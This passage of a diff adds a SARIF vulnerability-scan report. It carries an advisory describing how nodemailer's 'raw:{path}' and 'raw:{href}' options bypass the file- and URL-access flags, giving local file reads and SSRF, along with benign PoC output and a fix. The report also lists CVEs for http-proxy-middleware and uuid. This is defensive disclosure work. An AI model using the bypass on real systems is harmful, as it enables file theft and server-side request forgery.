GHSA-wqvq-jvpq-h66f for exactly this \"untrusted input + flag set\"\n   model. The asymmetry — attachment `{path}` is blocked but `raw:{path}` is not — is the bug, and\n   the PoC's CONTROL case proves the flag is otherwise effective on the same file.\n2. **\"The raw node inherits the flags via rootNode.\"** Rejected by code and by PoC: `compile():35`\n   constructs the node with `{ newline }` only; `MimeNode` constructor sets\n   `this.disableFileAccess = !!options.disableFileAccess` → `false`; `rootNode` is itself; no\n   inheritance exists.\n3. **\"The PoC leaks for an unrelated reason.\"** Rejected: the CONTROL message (`attachments:[{path}]`,\n   same file, same transporter) returns `EFILEACCESS`; only the `raw:{path}` message leaks. The\n   sentinel nonce exists solely in the temp file; the URL nonce is generated server-side and is only\n   obtainable by an actual fetch. Both observables are uniquely bound to the bypass.\n4. **\"Maybe only jsonTransport (already reported) is affected.\"** Rejected: the PoC uses\n   `streamTransport` and the root cause is in `MailComposer.compile()` (`mailer:188`), shared by all\n   transports; jsonTransport is a different (already-fixed) path.\n\nI could not find any guard that blocks the chain; the finding survives.\n\n## Proof of concept (safe, benign)\n\n`findings/nodemailer/raw/poc-raw-fileaccess-bypass.js` — local, no network egress (loopback only),\nno destructive action. Output:\n```\n[CONTROL] attachment path with disableFileAccess: BLOCKED (EFILEACCESS) — flag works here\n[ATTACK]  raw:{path} with disableFileAccess=true: BYPASSED — sentinel file CONTENT present in message\n[ATTACK]  raw:{href} with disableUrlAccess=true (loopback server): BYPASSED — fetched body present (SSRF)\nVERDICT: CONFIRMED\n```\nRun: `node findings/nodemailer/raw/poc-raw-fileaccess-bypass.js` (exit 0 = confirmed).\n\n## Remediation\n\nThread the access policy onto the `raw` root node, exactly as the other builders do:\n```js\nif (this.mail.raw) {\n    this.message = new MimeNode('message/rfc822', {\n        newline: this.mail.newline,\n        disableFileAccess: this.mail.disableFileAccess,\n        disableUrlAccess: this.mail.disableUrlAccess\n    }).setRaw(this.mail.raw);\n}\n```\n(Defense in depth: `setRaw`/`_getStream` could also refuse `{path}`/`{href}` raw content when either\nflag is set, regardless of how the node was constructed.) Add a regression test asserting that\n`raw:{path}` and `raw:{href}` reject with `EFILEACCESS`/`EURLACCESS` when the flags are set, mirroring\nthe attachment tests."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.1,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
+                "precision": "very-high",
+                "security-severity": "7.1",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-41907",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "uuid: uuid: Out-of-bounds write vulnerability impacts data integrity and confidentiality"
+              },
+              "fullDescription": {
+                "text": "uuid is for the creation of RFC9562 (formerly RFC4122) UUIDs. Prior to 14.0.0, v3, v5, and v6 accept external output buffers but do not reject out-of-range writes (small buf or large offset). This allows silent partial writes into caller-provided buffers. This vulnerability is fixed in 14.0.0."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-41907",
+              "help": {
+                "text": "Vulnerability CVE-2026-41907\nSeverity: MEDIUM\nPackage: uuid\nFixed Version: 11.1.1, 12.0.1, 13.0.1\nLink: [CVE-2026-41907](https://avd.aquasec.com/nvd/cve-2026-41907)\nuuid is for the creation of RFC9562 (formerly RFC4122) UUIDs. Prior to 14.0.0, v3, v5, and v6 accept external output buffers but do not reject out-of-range writes (small buf or large offset). This allows silent partial writes into caller-provided buffers. This vulnerability is fixed in 14.0.0.",
+                "markdown": "**Vulnerability CVE-2026-41907**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|uuid|11.1.1, 12.0.1, 13.0.1|[CVE-2026-41907](https://avd.aquasec.com/nvd/cve-2026-41907)|\n\nuuid is for the creation of RFC9562 (formerly RFC4122) UUIDs. Prior to 14.0.0, v3, v5, and v6 accept external output buffers but do not reject out-of-range writes (small buf or large offset). This allows silent partial writes into caller-provided buffers. This vulnerability is fixed in 14.0.0."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.5,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                "cvssv40_baseScore": 6.3,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            }
+          ],
+          "version": "0.69.3"
+        }
+      },
+      "results": [
+        {
+          "ruleId": "CVE-2026-55603",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "Package: http-proxy-middleware\nInstalled Version: 3.0.5\nVulnerability CVE-2026-55603\nSeverity: HIGH\nFixed Version: 3.0.7, 4.1.1\nLink: [CVE-2026-55603](https://avd.aquasec.com/nvd/cve-2026-55603)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 9176,
+                  "startColumn": 1,
+                  "endLine": 9192,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: http-proxy-middleware@3.0.5"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-55602",
+          "ruleIndex": 1,
+          "level": "warning",
+          "message": {
+            "text": "Package: http-proxy-middleware\nInstalled Version: 3.0.5\nVulnerability CVE-2026-55602\nSeverity: MEDIUM\nFixed Version: 3.0.6, 4.1.0, 2.0.10\nLink: [CVE-2026-55602](https://avd.aquasec.com/nvd/cve-2026-55602)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 9176,
+                  "startColumn": 1,
+                  "endLine": 9192,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: http-proxy-middleware@3.0.5"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "GHSA-p6gq-j5cr-w38f",
+          "ruleIndex": 2,
+          "level": "error",
+          "message": {
+            "text": "Package: nodemailer\nInstalled Version: 9.0.0\nVulnerability GHSA-p6gq-j5cr-w38f\nSeverity: HIGH\nFixed Version: 9.0.1\nLink: [GHSA-p6gq-j5cr-w38f](https://github.com/advisories/GHSA-p6gq-j5cr-w38f)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 11826,
+                  "startColumn": 1,
+                  "endLine": 11834,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: nodemailer@9.0.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-41907",
+          "ruleIndex": 3,
+          "level": "warning",
+          "message": {
+            "text": "Package: uuid\nInstalled Version: 7.0.3\nVulnerability CVE-2026-41907\nSeverity: MEDIUM\nFixed Version: 11.1.1, 12.0.1, 13.0.1\nLink: [CVE-2026-41907](https://avd.aquasec.com/nvd/cve-2026-41907)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 15083,
+                  "startColumn": 1,
+                  "endLine": 15091,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: uuid@7.0.3"
+              }
+            }
+          ]
+        }
+      ],
+      "columnKind": "utf16CodeUnits",
+      "originalUriBaseIds": {
+        "ROOTPATH": {
+          "uri": "file:///"
+        }
+      }
+    }
+  ]
+}
